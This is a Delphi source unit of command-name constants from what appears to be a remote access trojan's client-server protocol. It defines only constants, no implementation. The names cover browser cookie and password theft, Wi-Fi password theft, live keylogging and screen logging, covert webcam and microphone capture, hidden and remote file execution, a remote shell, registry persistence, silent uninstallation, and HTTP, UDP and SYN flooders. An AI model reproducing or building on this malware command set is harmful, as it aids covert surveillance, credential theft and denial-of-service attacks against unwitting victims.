unit UnitCommands;

interface

const
  ACTIVECONNECTIONS = 'activeconnections';
  ACTIVECONNECTIONSCLOSE = 'activeconnectionsclose';     
  ACTIVECONNECTIONSLIST = 'activeconnectionslist';
                                          
  BROWSERSCOOKIES = 'browserscookies';
  BROWSERSPASSWORDS = 'browserspasswords';

  CDDRIVE = 'cddrive';
  CDDRIVECLOSE = 'cddriveclose';
  CDDRIVEOPEN = 'cddriveopen';
     
  CHAT = 'chat';
  CHATSTART = 'chatstart';
  CHATSTOP = 'chatstop';
  CHATTEXT = 'chattext';

  CLIENT = 'client';
  CLIENTCONFIGURATION = 'clientconfiguration';
  CLIENTCLOSE = 'clientclose';
  CLIENTDOWNLOADSQLFILE = 'clientdownloadsqlfile';
  CLIENTDOWNLOADPLUGIN = 'clientdownloadplugin';
  CLIENTNEW = 'clientnew';
  CLIENTPLUGINSLIST = 'clientpluginlist';
  CLIENTRECONNECT = 'clientreconnect';
  CLIENTRENAME = 'clientrename';
  CLIENTRENAMEGROUP = 'clientrenamegroup';
  CLIENTRESTART = 'clientrestart';
  CLIENTTASKEXECUTE = 'clienttaskexecute';
  CLIENTUNINSTALL = 'clientuninstall';
  CLIENTUPDATECONFIG = 'clientupdateconfig';
  CLIENTUPDATEFROMFTP = 'clientupdatefromftp';
  CLIENTUPDATEFROMLINK = 'clientupdatefromlink';
  CLIENTUPDATEFROMLOCAL = 'clientupdatefromlocal';

  CLIPBOARD = 'clipboard';          
  CLIPBOARDCLEAR = 'clipboardclear';    
  CLIPBOARDFILES = 'clipboardfiles';
  CLIPBOARDTEXT = 'clipboardtext';
  CLIPBOARDSETTEXT = 'clipboardsettext';

  COMPUTER = 'computer';
  COMPUTERBEEP = 'computerbeep';
  COMPUTERHIBERNATE = 'computerhibernate';
  COMPUTERLOGOFF = 'computerlogoff';    
  COMPUTERREBOOT = 'computerreboot';
  COMPUTERSHUTDOWN = 'computershutdown';
  COMPUTERSPEAK = 'computerspeak';

  CUSTOMPLUGINEXECUTE = 'custompluginexecute';
  CUSTOMPLUGININSTALL = 'customplugininstall';
  CUSTOMPLUGINUNINSTALL = 'custompluginuninstall';
  CUSTOMPLUGINSTART = 'custompluginstart';

  DEVICES = 'devices';
  DEVICESLIST = 'deviceslist';
  DEVICESLISTEXTRAS = 'deviceslistextras';
 
  DESKTOPCAPTURESTART = 'desktopcapturestart';
  DESKTOPCAPTURESTOP = 'desktopcapturestop';
  DESKTOPHIDEICONS = 'desktophideicons';      
  DESKTOPHIDESYSTEMTRAY = 'desktophidesystemtray';
  DESKTOPHIDETASKSBAR = 'desktophidetasksbar';
  DESKTOPSHOWICONS = 'desktopshowicons';
  DESKTOPSETTINGS = 'desktopsettings';
  DESKTOPSHOWSYSTEMTRAY = 'desktopshowsystemtray';
  DESKTOPSHOWTASKSBAR = 'desktopshowtasksbar';
  DESKTOPTHUMBNAILVIEW = 'desktopthumbnailview';

  EXECUTESHELLCOMMAND = 'executeshellcommand';

  FILESMANAGER = 'filesmanager';
  FILESCOPYFILE = 'filescopyfile';
  FILESCOPYFOLDER = 'filescopyfolder';                                 
  FILESCREATELINK = 'filescreatelink';
  FILESDELETEFILE = 'filesdeletefile';
  FILESDELETEFOLDER = 'filesdeletefolder';
  FILESDOWNLOADFILE = 'filesdownloadfile';   
  FILESDRIVESINFOS = 'filesdrivesinfos';
  FILESEDITFILE = 'fileseditfile';  
  FILESEDITFILESAVE = 'fileseditfilesave';
  FILESEXECUTEFROMFTP = 'filesexecutefromftp';
  FILESEXECUTEFROMLINK = 'filesexecutefromlink';
  FILESEXECUTEFROMLOCAL = 'filesexecutefromlocal';
  FILESEXECUTEHIDEN = 'filesexecutehiden';
  FILESEXECUTEVISIBLE = 'filesexecutevisible';
  FILESIMAGEPREVIEW = 'filesimagepreview';
  FILESLISTDRIVES = 'fileslistdrives'; 
  FILESLISTFILES = 'fileslistfiles';
  FILESLISTFOLDERS = 'fileslistfolders';  
  FILESLISTSHAREDFOLDERS = 'fileslistsharedfolders';
  FILESLISTSPECIALSFOLDERS = 'fileslistspecialsfolders';
  FILESMOVEFILE = 'filesmovefile';
  FILESMOVEFOLDER = 'filesmovefolder';
  FILESNEWFOLDER = 'filesnewfolder';   
  FILESNEWFILE = 'filesnewfile';
  FILESRENAMEFILE = 'filesrenamefile';
  FILESRENAMEFOLDER = 'filesrenamefolder';
  FILESSEARCHFILE = 'filessearchfile';
  FILESSEARCHDELETEFILE = 'filessearchdeletefile';
  FILESSEARCHRENAMEFILE = 'filessearchrenamefile';
  FILESSEARCHIMAGEPREVIEW = 'filessearchimagepreview';
  FILESSEARCHRESULTS = 'filessearchresults';
  FILESSENDEMAIL = 'filessendemail';
  FILESSENDFTP = 'filessendftp';
  FILESSETATTRIBUTES = 'filessetattributes';    
  FILESSETWALLPAPER = 'filessetwallpaper';
  FILESSTOPSEARCHING = 'filestopsearching';  
  FILESUPLOADFILEFROMLOCAL = 'filesuploadfilefromlocal';

  FLOODERHTTPSTART = 'flooderhttpstart';
  FLOODERHTTPSTOP = 'flooderhttpstop';
  FLOODERUDPSTART = 'flooderudpstart';
  FLOODERUDPSTOP = 'flooderudpstop';
  FLOODERSYNSTART = 'floodersynstart';
  FLOODERSYNSTOP = 'floodersynstop';

  INFOS = 'infos';
  INFOSMAIN = 'infosmain';
  INFOSREFRESH = 'infosrefresh';
  INFOSSYSTEM = 'infossystem';

  KEYLOGGERDELLOG = 'keyloggerdellog'; 
  KEYLOGGERDELREPO = 'keyloggerdelrepo';
  KEYLOGGERLISTLOGS = 'keyloggerlistlogs';
  KEYLOGGERLISTREPO = 'keyloggerlistrepo'; 
  KEYLOGGERLIVESTART = 'keyloggerlivestart';
  KEYLOGGERLIVESTOP = 'keyloggerlivestop';
  KEYLOGGERREADLOG = 'keyloggerreadlog';

  LOGGER = 'logger';

  MESSAGESBOX = 'messagesbox';                  
  MESSAGESBALLOON = 'messagesballoon';
  MESSAGESBOXHOSTSLIST = 'messagesboxhostslist';

  MICROPHONECAPTURESTART = 'microphonestart';
  MICROPHONECAPTURESTOP = 'microphonestop';

  MONITOR = 'monitor';
  MONITORPOWER = 'monitorpower';

  MOUSECRAZY = 'mousecrazy';
  MOUSEFREEZE = 'mousefreeze';
  MOUSELEFTCLICK = 'mouseleftclick';   
  MOUSELEFTDOUBLECLICK = 'mouseleftdoubleclick';   
  MOUSEMOVECURSOR = 'mousemovecurosr';
  MOUSERIGHTCLICK = 'mouserightclick';
  MOUSERIGHTDOUBLECLICK = 'mouserightdoubleclick';
  MOUSESWAPBUTTONS = 'mouseswapbuttons';

  MULTIDESKTOPSTART = 'multidesktopstart';
  MULTIDESKTOPSTOP = 'multidesktopstop';
  MULTIWEBCAMSTART = 'multiwebcamstart';
  MULTIWEBCAMSTOP = 'multiwebcamstop';

  PASSWORDS = 'passwords';

  PING = 'ping';

  PORTSCANNER = 'portscanner';               
  PORTSCANNERCOUNT = 'portscannercount';
  PORTSCANNERRESULTS = 'portscannerresults';
  PORTSCANNERSTART = 'portscannerstart';
  PORTSCANNERSTOP = 'portscannerstop';

  PORTSNIFFER = 'portsniffer';
  PORTSNIFFERINTERFACES = 'portsnifferinterfaces';  
  PORTSNIFFERRESULTS = 'portsnifferresults';
  PORTSNIFFERSTART = 'portsnifferstart';
  PORTSNIFFERSTOP = 'portsnifferstop';

  PONG = 'pong';

  PROCESS = 'process';  
  PROCESSKILL = 'processkill';
  PROCESSLIST = 'processlist';
  PROCESSLISTMODULES = 'processlistmodules';
  PROCESSRESUME = 'processresume';
  PROCESSSETPRIORITY = 'processsetpriority';
  PROCESSSUSPEND = 'processsuspend';

  PROGRAMS = 'programs';
  PROGRAMSLIST = 'programslist';  
  PROGRAMSSILENTUNINSTALL = 'programssilentuninstall';
  PROGRAMSUNINSTALL = 'programsuninstall';

  PROXY = 'proxy';
  PROXYSTART = 'proxystart';
  PROXYSTOP = 'proxystop';

  REGISTRY = 'registry';       
  REGISTRYADDKEY_VALUE = 'registryaddkey_value';
  REGISTRYDELETEKEY_VALUE = 'registrydeletekey_value';
  REGISTRYLISTKEYS = 'registrylistkeys';
  REGISTRYLISTVALUES = 'registrylistvalues';
  REGISTRYRENAMEKEY = 'registryrenamekey';
  REGISTRYRENAMEVALUE = 'registryrenamevalue';
  REGISTRYSTARTUPADD = 'registrystartupadd';
  REGISTRYSTARTUPDELETE = 'registrystartupdelete';
  REGISTRYSTARTUPLIST = 'registrystartuplist';

  REQUESTADMIN = 'requestadmin';

  SERVICES = 'services';     
  SERVICESEDIT = 'servicesedit';
  SERVICESINSTALL = 'servicesinstall';
  SERVICESLIST = 'serviceslist';
  SERVICESSTART = 'servicesstart';
  SERVICESSTOP = 'servicesstop';
  SERVICESUNINSTALL = 'servicesuninstall';

  SCREENLOGGERDELLOG = 'screenloggerdellog';
  SCREENLOGGERDELREPO = 'screenloggerdelrepo';
  SCREENLOGGERLISTLOGS = 'screenloggerlistlogs';
  SCREENLOGGERLISTREPO = 'screenloggerlistrepo';
  SCREENLOGGERREADLOG = 'screenloggerreadlog';
  SCRIPTEXECUTE = 'scriptexecute';

  SHELL = 'shell';      
  SHELLCOMMAND = 'shellcommand';
  SHELLDATAS = 'shelldatas';
  SHELLSTART = 'shellstart';
  SHELLSTOP = 'shellstop';

  SYSTEM = 'system';
  SYSTEMHOSTSFILE = 'systemhostsfile';
  SYSTEMHOSTSFILEEDIT = 'systemhostsfileedit';
  SYSTEMEVENTSLOGS = 'systemeventslog';

  TASKSMANAGER = 'tasksmanager';

  WEBCAM = 'webcam';
  WEBCAMCAPTURESTART = 'webcamcapturestart';
  WEBCAMCAPTURESTOP = 'webcamcapturestop'; 
  WEBCAMDRIVERS = 'webcamdrivers';
  WEBCAMSETTINGS = 'webcamsettings';

  WIFIPASSWORDS = 'wifipasswords';

  WINDOWS = 'windows';
  WINDOWSMAXIMIZE = 'windowsmaximize';
  WINDOWSMINIMIZE = 'windowsminimize';
  WINDOWSRESTORE = 'windowsrestore';
  WINDOWSKEYS = 'windowskeys';
  WINDOWSCLOSE = 'windowsclose';
  WINDOWSHIDE = 'windowshide';
  WINDOWSLIST = 'windowslist';   
  WINDOWSPREVIEW = 'windowspreview';
  WINDOWSSHAKE = 'windowsshake';
  WINDOWSSHOW = 'windowsshow';
  WINDOWSTHUMBNAILS = 'windowsthumbnails';
  WINDOWSTITLE = 'windowstitle';

implementation

end.


